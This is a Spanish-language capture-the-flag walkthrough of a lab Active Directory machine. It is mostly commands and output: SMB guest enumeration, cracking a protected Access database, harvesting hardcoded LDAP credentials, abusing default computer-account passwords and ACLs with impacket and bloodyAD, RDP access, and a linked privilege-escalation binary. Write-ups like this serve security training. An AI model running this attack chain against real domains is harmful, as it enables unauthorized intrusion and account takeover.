>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.41.75 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-14 12:52 EST
Nmap scan report for 10.129.41.75
Host is up (0.059s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-14 17:52:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: RETRO2)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.95 seconds
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo "10.129.41.75 retro2.vl BLN01 bln01.retro2.vl" >> /etc/hosts
```

>Enumeramos con netexec datos del DC:

```bash
┌──(kali㉿jbkira)-[~]
└─$ nxc smb 10.129.41.75                                         
SMB         10.129.41.75    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
```

>Enumeramos shares por SMB empleando Guest Login:

```bash
┌──(kali㉿jbkira)-[~]
└─$ nxc smb 10.129.41.75 -u 'guest' -p '' --shares
SMB         10.129.41.75    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.41.75    445    BLN01            [+] retro2.vl\guest: 
SMB         10.129.41.75    445    BLN01            [*] Enumerated shares
SMB         10.129.41.75    445    BLN01            Share           Permissions     Remark
SMB         10.129.41.75    445    BLN01            -----           -----------     ------
SMB         10.129.41.75    445    BLN01            ADMIN$                          Remote Admin
SMB         10.129.41.75    445    BLN01            C$                              Default share
SMB         10.129.41.75    445    BLN01            IPC$                            Remote IPC
SMB         10.129.41.75    445    BLN01            NETLOGON                        Logon server share 
SMB         10.129.41.75    445    BLN01            Public          READ            
SMB         10.129.41.75    445    BLN01            SYSVOL                          Logon server share
```

>Nos conectamos a la share y nos llevamos una base de datos de Access:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ smbclient -U "guest" '\\10.129.41.75\Public'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> cd DB
smb: \DB\> get staff.accdb 
getting file \DB\staff.accdb of size 876544 as staff.accdb (783.9 KiloBytes/sec) (average 783.9 KiloBytes/sec)
```

>Crackeamos sus credenciales ya que está password protected:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ office2john staff.accdb > access_hash                                            
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ john -w=/usr/share/wordlists/rockyou.txt access_hash       
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
class08          (staff.accdb)     
1g 0:00:00:31 DONE (2026-01-14 12:59) 0.03172g/s 146.1p/s 146.1c/s 146.1C/s diamante..class08
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

>Al abrir la base de datos en Microsoft Access, vemos un script en VBS que tiene las credenciales: `ldapreader:ppYaVcB5R` 

```vb
Sub ImportStaffUsersFromLDAP()
    Dim objConnection As Object
    Dim objCommand As Object
    Dim objRecordset As Object
    Dim strLDAP As String
    Dim strUser As String
    Dim strPassword As String
    Dim strSQL As String
    Dim db As Database
    Dim rst As Recordset
    
    strLDAP = "LDAP://OU=staff,DC=retro2,DC=vl"
    strUser = "retro2\ldapreader"
    strPassword = "ppYaVcB5R"
    
    Set objConnection = CreateObject("ADODB.Connection")
    
    objConnection.Provider = "ADsDSOObject"
    objConnection.Properties("User ID") = strUser
    objConnection.Properties("Password") = strPassword
    objConnection.Properties("Encrypt Password") = True
    objConnection.Open "Active Directory Provider"
    
    Set objCommand = CreateObject("ADODB.Command")
    objCommand.ActiveConnection = objConnection
    
    objCommand.CommandText = "<" & strLDAP & ">;(objectCategory=person);cn,distinguishedName,givenName,sn,sAMAccountName,userPrincipalName,description;subtree"
    
    Set objRecordset = objCommand.Execute
    
    Set db = CurrentDb
    Set rst = db.OpenRecordset("StaffMembers", dbOpenDynaset)
    
    Do Until objRecordset.EOF
        rst.AddNew
        rst!CN = objRecordset.Fields("cn").Value
        rst!DistinguishedName = objRecordset.Fields("distinguishedName").Value
        rst!GivenName = Nz(objRecordset.Fields("givenName").Value, "")
        rst!SN = Nz(objRecordset.Fields("sn").Value, "")
        rst!sAMAccountName = objRecordset.Fields("sAMAccountName").Value
        rst!UserPrincipalName = Nz(objRecordset.Fields("userPrincipalName").Value, "")
        rst!Description = Nz(objRecordset.Fields("description").Value, "")
        rst.Update
        
        objRecordset.MoveNext
    Loop
    
    rst.Close
    objRecordset.Close
    objConnection.Close
    Set rst = Nothing
    Set objRecordset = Nothing
    Set objCommand = Nothing
    Set objConnection = Nothing
    
    MsgBox "Staff users imported successfully!", vbInformation
End Sub
```

>Vemos que las credenciales del usuario **ldapreader** son válidas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ nxc smb 10.129.41.75 -u 'ldapreader' -p 'ppYaVcB5R'
SMB         10.129.41.75    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.41.75    445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R 
```

>Ingestamos archivos de **BloodHound**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ bloodhound-ce-python -u 'ldapreader' -p 'ppYaVcB5R' -k -ns 10.129.41.75 -d retro2.vl -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: retro2.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: bln01.retro2.vl
INFO: Testing resolved hostname connectivity dead:beef::d00b:60fd:e5c6:b0ff
INFO: Trying LDAP connection to dead:beef::d00b:60fd:e5c6:b0ff
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: bln01.retro2.vl
INFO: Testing resolved hostname connectivity dead:beef::d00b:60fd:e5c6:b0ff
INFO: Trying LDAP connection to dead:beef::d00b:60fd:e5c6:b0ff
INFO: Found 27 users
INFO: Found 43 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: BLN01.retro2.vl
INFO: Done in 00M 15S
INFO: Compressing output into 20260114130631_bloodhound.zip
```

>Vemos que las siguientes cuentas de máquina pertenecen al grupo **Pre-Windows 2000 Compatible Access** que hace que por defecto tengan como credenciales su **SamAccountName**:

<img width="826" height="257" alt="image" src="https://github.com/user-attachments/assets/9cba2ad0-c715-4f23-8d83-8f0bc9e677b3" />

>Probamos credenciales y vemos que son válidas para **FS01$ y FS02$**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ nxc smb 10.129.41.75 -u 'FS01$' -p 'fs01'
SMB         10.129.41.75    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.41.75    445    BLN01            [-] retro2.vl\FS01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ nxc smb 10.129.41.75 -u 'FS02$' -p 'fs02'
SMB         10.129.41.75    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.41.75    445    BLN01            [-] retro2.vl\FS02$:fs02 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ nxc smb 10.129.41.75 -u 'ADMWS01$' -p 'admws01'
SMB         10.129.41.75    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.41.75    445    BLN01            [-] retro2.vl\ADMWS01$:admws01 STATUS_LOGON_FAILURE 
```

>Les cambiamos la contraseña para poder acceder:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ changepasswd.py 'retro2.vl/FS02$@10.129.41.75' -newpass 'Password123$!' -protocol rpc-samr
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
[*] Changing the password of retro2.vl\FS02$
[*] Connecting to DCE/RPC as retro2.vl\FS02$
[*] Password was changed successfully.
```

>Vemos que la cuenta tiene las ACEs **ForceChangePassword** y **GenericWrite** sobre **ADMWS01$**:

<img width="677" height="341" alt="image" src="https://github.com/user-attachments/assets/e8851e1b-dc8b-4aaa-9a70-9b53bc6e06d7" />

>Le cambiamos la contraseña a **ADMWS01$** abusando la ACE **ForceChangePassword**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ bloodyAD --host bln01.retro2.vl -u 'FS02$' -p 'Password123$!' set password 'ADMWS01$' 'Password123$!'
[+] Password changed successfully!
```

>Vemos que el usuario **ADMWS01$** puede agregar usuarios o a sí mismo al grupo **Services** mediante las ACEs **AddSelf** y **AddMember**:

<img width="387" height="216" alt="image" src="https://github.com/user-attachments/assets/7330f717-8303-4173-bf7e-a05017fcfad2" />

>Agregamos al usuario **ldapreader** al grupo **services** abusando la ACE **AddMember**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ bloodyAD --host bln01.retro2.vl -u 'ADMWS01$' -p 'Password123$!' add groupMember 'Services' 'ldapreader'
[+] ldapreader added to Services
```

>Vemos que el grupo **Services** pertenece al grupo **Remote Desktop Users**, así que podemos entrar por RDP al servidor:

<img width="1050" height="137" alt="image" src="https://github.com/user-attachments/assets/695df13e-d69a-47be-9c17-3c39713a1d6b" />

>Entramos por RDP usando **xfreerdp**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retrotwo]
└─$ xfreerdp3 /u:'ldapreader' /p:'ppYaVcB5R' /v:10.129.41.75 /d:retro2.vl /sec:rdp &>/dev/null & disown
[1] 32947
```

>Leemos la user.txt:

<img width="744" height="390" alt="image" src="https://github.com/user-attachments/assets/4f0bfb2a-27ee-488e-981a-9480fad40da9" />

>Como se trata de un Windows Server 2008R vamos a emplear Perfusion para obtener acceso como SYSTEM: https://github.com/manesec/Pentest-Binary/blob/main/Perfusion.exe

<img width="704" height="146" alt="image" src="https://github.com/user-attachments/assets/19d5fb12-372f-4704-b21f-3248eab6d025" />

>Leemos la root flag:

<img width="535" height="28" alt="image" src="https://github.com/user-attachments/assets/55bcecad-3780-40df-b140-4030716a0224" />

